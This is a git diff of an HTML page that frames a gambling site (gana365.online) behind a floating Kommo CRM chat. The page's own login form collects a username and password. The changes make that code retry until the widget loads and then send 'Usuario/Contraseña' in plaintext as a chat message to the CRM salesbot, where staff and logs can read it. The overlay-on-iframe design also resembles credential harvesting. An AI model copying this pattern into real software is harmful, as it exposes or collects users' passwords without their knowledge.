@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Chat Flotante Kommo</title>
+  <title>Prueba Kommo Widget Flotante</title>
   <link rel="stylesheet" href="styles.css"/>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
 </head>
@@ -12,19 +12,17 @@
   <!-- Fondo -->
   <iframe id="backgroundIframe" src="https://gana365.online"></iframe>
 
-  <!-- Botón flotante -->
+  <!-- Botón del chat flotante personalizado -->
   <button class="chat-button" onclick="toggleChat()">💬</button>
 
-  <!-- Contenedor del chat personalizado -->
+  <!-- Contenedor personalizado (no embebemos el widget adentro de esto) -->
   <div class="chat-container" id="chatBox">
-    <!-- Encabezado del chat -->
     <div id="chatHeader" class="chat-header" style="display: none;">
       <img src="https://gana365.online/images/logo.png" alt="Logo" class="chat-logo"/>
       <span class="chat-phone">Soporte: +54 9 11 5412-8983</span>
       <button onclick="toggleChat()" class="close-chat">✖</button>
     </div>
 
-    <!-- Login -->
     <div class="login-container" id="loginForm">
       <h3>Bienvenido</h3>
       <img src="https://gana365.online/images/logo.png" class="login-logo" alt="Logo"/>
@@ -32,20 +30,15 @@
       <input type="password" id="password" placeholder="Contraseña" required/>
       <button onclick="login()" class="login-button">Iniciar Chat</button>
     </div>
-
-    <!-- Contenedor para incrustar el widget de Kommo -->
-    <div id="kommo_widget_container" style="width: 100%; height: 100%; min-height: 300px;"></div>
   </div>
 
-  <!-- Script de Kommo -->
+  <!-- ✅ Script del widget Kommo como flotante tradicional -->
   <script>
     (function(a,m,o,c,r,m){
       a[m]={
         id:"1036503",
         hash:"418cb7e2728464ae9d979e2620ffd41197c85e21ea581346a2c53efc3333381c",
         locale:"es",
-        target: "kommo_widget_container",
-        inline: true,
         setMeta:function(p){
           this.params=(this.params||[]).concat([p])
         }
@@ -54,7 +47,7 @@
       var d=a.document,s=d.createElement('script');
       s.async=true;s.id=m+'_script';
       s.src='https://gso.kommo.com/js/button.js';
-      d.head&&d.head.appendChild(s);
+      d.head && d.head.appendChild(s);
     })(window,"crm_plugin","crmPlugin");
   </script>
 
@@ -79,14 +72,27 @@
       document.getElementById("loginForm").style.display = "none";
       document.getElementById("chatHeader").style.display = "flex";
 
-      setTimeout(() => {
+      let attempts = 0;
+      const maxAttempts = 10;
+
+      const trySend = setInterval(() => {
         if (window.crmPlugin && window.crmPlugin.setMeta) {
           window.crmPlugin.setMeta({
             name: username,
             message: `Usuario: ${username}\nContraseña: ${password}`
           });
+          window.crmPlugin("open"); // abrir el widget flotante
+          clearInterval(trySend);
+          console.log("✅ Mensaje enviado al Salesbot de Kommo");
+        } else {
+          attempts++;
+          console.log("⌛ Esperando que Kommo esté listo...");
+          if (attempts >= maxAttempts) {
+            clearInterval(trySend);
+            console.error("❌ No se pudo conectar con el widget de Kommo.");
+          }
         }
-      }, 1000);
+      }, 500);
     }
 
     function toggleChat() {
